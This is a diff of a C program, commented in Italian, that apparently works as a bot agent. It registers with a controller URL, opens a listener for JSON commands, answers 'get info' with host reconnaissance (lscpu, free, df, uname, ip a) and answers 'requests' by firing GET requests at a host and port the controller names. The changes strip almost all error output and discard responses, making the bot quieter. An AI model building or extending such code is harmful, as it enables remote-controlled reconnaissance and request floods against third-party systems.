@@ -40,9 +40,13 @@ int start_server(int port);
 
 int handle_post_request(int client_socket);
 
+void send_ok_request(json_object *responseJson, int client_socket);
+
+void send_error_request(int client_socket);
+
 int main(int argc, char *argv[]) {
     if (argc != 2) {
-        fprintf(stderr, "Usage: %s <server_url>\n", argv[0]);
+        printf("Usage: %s <server_url>\n", argv[0]);
         return 1;
     }
 
@@ -54,19 +58,16 @@ int main(int argc, char *argv[]) {
 
     int numListeningPorts = find_listening_ports(freePorts, MAX_LISTENING_PORTS);
     if (numListeningPorts == -1) {
-        fprintf(stderr, "Errore durante la ricerca delle porte in ascolto.\n");
         return 1;
     }
 
     int result = find_web_exposed_interface(&webInterface);
     if (result == -1) {
-        fprintf(stderr, "Errore durante la ricerca dell'interfaccia esposta sul web.\n");
         return 1;
     }
 
     int randomPort = generate_random_port(freePorts, numListeningPorts);
     if (randomPort == -1) {
-        fprintf(stderr, "Nessuna porta libera disponibile.\n");
         return 1;
     }
 
@@ -79,7 +80,6 @@ int main(int argc, char *argv[]) {
     // Invia le informazioni al server HTTP utilizzando l'URL passato come argomento
     result = send_server_info(&serverInfo, serverURL);
     if (result == -1) {
-        fprintf(stderr, "Errore nell'invio delle informazioni al server HTTP.\n");
         return 1;
     }
 
@@ -88,12 +88,17 @@ int main(int argc, char *argv[]) {
         int serverPort = serverInfo.ports[0]; // Assume che ci sia almeno una porta nell'array
         result = start_server(serverPort);
         if (result == -1) {
-            fprintf(stderr, "Errore nell'avvio del server sulla porta %d\n", serverPort);
             return 1;
         }
     }
 
     return 0;
+}
+
+// Funzione di callback per ignorare i dati ricevuti
+size_t write_callback_ignore_response(void *ptr, size_t size, size_t count, void *userdata) {
+    // Questa funzione ignora completamente i dati ricevuti
+    return size * count;
 }
 
 int find_listening_ports(int *freePorts, int maxPorts) {
@@ -102,7 +107,6 @@ int find_listening_ports(int *freePorts, int maxPorts) {
     for (int port = 1024; port <= 65535 && numFreePorts < maxPorts; ++port) {
         int sockfd = socket(AF_INET, SOCK_STREAM, 0);
         if (sockfd == -1) {
-            perror("Errore nella creazione del socket");
             return -1;  // Segnala un errore
         }
 
@@ -128,7 +132,6 @@ int find_web_exposed_interface(struct NetworkInterface *webInterface) {
     struct ifaddrs *ifaddr, *ifa;
 
     if (getifaddrs(&ifaddr) == -1) {
-        perror("Errore durante la ricerca delle interfacce di rete");
         return -1;
     }
 
@@ -272,7 +275,6 @@ int start_server(int port) {
     // Crea un socket
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd == -1) {
-        perror("Errore nella creazione del socket");
         return -1;
     }
 
@@ -284,13 +286,11 @@ int start_server(int port) {
 
     // Collega il socket all'indirizzo del server
     if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) == -1) {
-        perror("Errore nella bind");
         return -1;
     }
 
     // Inizia ad ascoltare sul socket
     if (listen(sockfd, 5) == -1) {
-        perror("Errore nell'ascolto");
         return -1;
     }
 
@@ -301,7 +301,6 @@ int start_server(int port) {
         clilen = sizeof(cli_addr);
         newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
         if (newsockfd == -1) {
-            perror("Errore nell'accettare la connessione");
             return -1;
         }
 
@@ -320,7 +319,7 @@ int start_server(int port) {
     return 0;
 }
 
-char* get_info(char* command) {
+char *get_info(char *command) {
     char result[512];
     char *buffer = NULL;
     size_t buffer_size = 0;
@@ -329,14 +328,12 @@ char* get_info(char* command) {
     if (file) {
         while (fgets(result, sizeof(result), file) != NULL) {
             size_t result_len = strlen(result);
-            buffer = (char*)realloc(buffer, buffer_size + result_len + 1);
+            buffer = (char *) realloc(buffer, buffer_size + result_len + 1);
             if (buffer) {
                 memcpy(buffer + buffer_size, result, result_len);
                 buffer_size += result_len;
                 buffer[buffer_size] = '\0'; // Assicura la terminazione corretta della stringa
             } else {
-                // Gestione errore di allocazione
-                perror("Errore di allocazione di memoria");
                 break;
             }
         }
@@ -350,7 +347,7 @@ int send_get_request_to_the_target(json_object *json) {
     json_object *hostnameItem = NULL;
     json_object *portItem = NULL;
 
-    if (json_object_object_get_ex(json, "hostname", &hostnameItem) && json_object_object_get_ex(json, "port", &portItem)) {
+    if (json_object_object_get_ex(json, "host", &hostnameItem) && json_object_object_get_ex(json, "port", &portItem)) {
         const char *hostname = json_object_get_string(hostnameItem);
         const char *port = json_object_get_string(portItem);
         printf("hostname %s\n", hostname);
@@ -370,14 +367,14 @@ int send_get_request_to_the_target(json_object *json) {
 
             curl = curl_easy_init();
             if (curl) {
+                curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
                 curl_easy_setopt(curl, CURLOPT_URL, url);
                 curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
+                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback_ignore_response);
 
                 res = curl_easy_perform(curl);
                 if (res != CURLE_OK) {
                     targetAlive = 0;
-                } else {
-                    printf("Sent GET request to %s\n", url);
                 }
 
                 curl_easy_cleanup(curl);
@@ -402,7 +399,6 @@ int handle_post_request(int client_socket) {
     bytesRead = recv(client_socket, buffer, sizeof(buffer), 0);
 
     if (bytesRead == -1) {
-        perror("Errore nella lettura della richiesta del client");
         return -1;
     }
 
@@ -415,9 +411,7 @@ int handle_post_request(int client_socket) {
 
     json_object *json = json_tokener_parse(data);
     if (json == NULL) {
-        fprintf(stderr, "Errore nel parsing del JSON\n");
-        char response[] = "HTTP/1.1 500 Internal Server Error\r\n\r\n";
-        send(client_socket, response, strlen(response), 0);
+        send_error_request(client_socket);
         return -1;
     }
 
@@ -427,28 +421,37 @@ int handle_post_request(int client_socket) {
         json_object *responseJson = json_object_new_object();
 
         if (strcmp(command, "get info") == 0) {
-            json_object_object_add(responseJson, "infoCPU", json_object_new_string( get_info("lscpu")));
+            json_object_object_add(responseJson, "infoCPU", json_object_new_string(get_info("lscpu")));
             json_object_object_add(responseJson, "infoRAM", json_object_new_string(get_info("free")));
             json_object_object_add(responseJson, "infoHD", json_object_new_string(get_info("df -h")));
             json_object_object_add(responseJson, "infoOS", json_object_new_string(get_info("uname -a")));
             json_object_object_add(responseJson, "infoNetwork", json_object_new_string(get_info("ip a")));
-        } else if (strcmp(command, "request") == 0) {
+            send_ok_request(responseJson, client_socket);
+        } else if (strcmp(command, "requests") == 0) {
+            send_ok_request(responseJson, client_socket);
             send_get_request_to_the_target(json);
         } else {
-            json_object_object_add(responseJson, "error", json_object_new_string("Comando sconosciuto"));
-            char response[] = "HTTP/1.1 500 Internal Server Error\r\n\r\n";
-            send(client_socket, response, strlen(response), 0);
+            send_error_request(client_socket);
         }
-
-        const char *responseString = json_object_to_json_string(responseJson);
-        char responseHeader[256];
-        snprintf(responseHeader, sizeof(responseHeader),
-                 "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %zu\r\n\r\n",
-                 strlen(responseString));
-        send(client_socket, responseHeader, strlen(responseHeader), 0);
-        send(client_socket, responseString, strlen(responseString), 0);
         json_object_put(json);
+
     }
 
     return 0;
+}
+
+
+void send_ok_request(json_object *responseJson, int client_socket) {
+    const char *responseString = json_object_to_json_string(responseJson);
+    char responseHeader[256];
+    snprintf(responseHeader, sizeof(responseHeader),
+             "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %zu\r\n\r\n",
+             strlen(responseString));
+    send(client_socket, responseHeader, strlen(responseHeader), 0);
+    send(client_socket, responseString, strlen(responseString), 0);
+}
+
+void send_error_request(int client_socket) {
+    char response[] = "HTTP/1.1 500 Internal Server Error\r\n\r\n";
+    send(client_socket, response, strlen(response), 0);
 }
